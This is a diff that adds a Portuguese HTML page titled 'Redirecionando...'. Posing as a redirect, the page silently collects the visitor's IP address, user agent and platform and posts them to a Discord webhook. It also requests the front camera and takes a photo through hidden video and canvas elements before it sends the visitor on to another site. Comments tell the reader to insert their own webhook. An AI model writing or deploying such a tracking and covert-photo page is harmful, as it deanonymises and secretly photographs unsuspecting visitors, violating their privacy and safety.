@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecionando...</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <h1>Redirecionando...</h1>
+    <video id="camera" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // Função para capturar o IP e enviar para o webhook do Discord
+        async function sendIPToDiscord() {
+            try {
+                // Obter o IP usando uma API externa
+                const ipResponse = await axios.get('https://api.ipify.org?format=json');
+                const ip = ipResponse.data.ip;
+
+                // Capturar dados adicionais (navegador, sistema operacional, etc.)
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+
+                // Mensagem para o Discord
+                const message = {
+                    content: `Novo acesso registrado!\nIP: ${ip}\nUser Agent: ${userAgent}\nPlatform: ${platform}`,
+                };
+
+                // Substitua SEU_WEBHOOK_AQUI pelo seu webhook do Discord
+                const webhookURL = 'SEU_WEBHOOK_AQUI';
+
+                // Enviar para o Discord
+                await axios.post(webhookURL, message);
+                console.log('IP enviado para o Discord!');
+            } catch (error) {
+                console.error('Erro ao enviar IP para o Discord:', error);
+            }
+        }
+
+        // Função para tentar capturar uma foto da câmera frontal
+        async function captureCamera() {
+            try {
+                const video = document.getElementById('camera');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                // Solicitar acesso à câmera frontal
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false,
+                });
+
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo para a câmera ligar
+
+                // Capturar foto
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Converter para base64 (para enviar ao Discord)
+                const photo = canvas.toDataURL('image/jpeg');
+
+                // Parar a câmera
+                stream.getTracks().forEach(track => track.stop());
+
+                return photo;
+            } catch (error) {
+                console.error('Erro ao acessar a câmera:', error);
+                return null;
+            }
+        }
+
+        // Função principal
+        async function main() {
+            await sendIPToDiscord(); // Envia o IP para o Discord
+
+            // Tenta capturar a câmera (usuário precisa permitir)
+            const photo = await captureCamera();
+            if (photo) {
+                console.log('Foto capturada! (em base64)');
+                // Aqui você pode enviar a foto para o Discord também (requer tratamento adicional)
+            }
+
+            // Redireciona para outro site após 3 segundos
+            setTimeout(() => {
+                window.location.href = 'https://exemplo.com'; // Substitua pelo site desejado
+            }, 3000);
+        }
+
+        // Executa o processo
+        main();
+    </script>
+</body>
+</html>
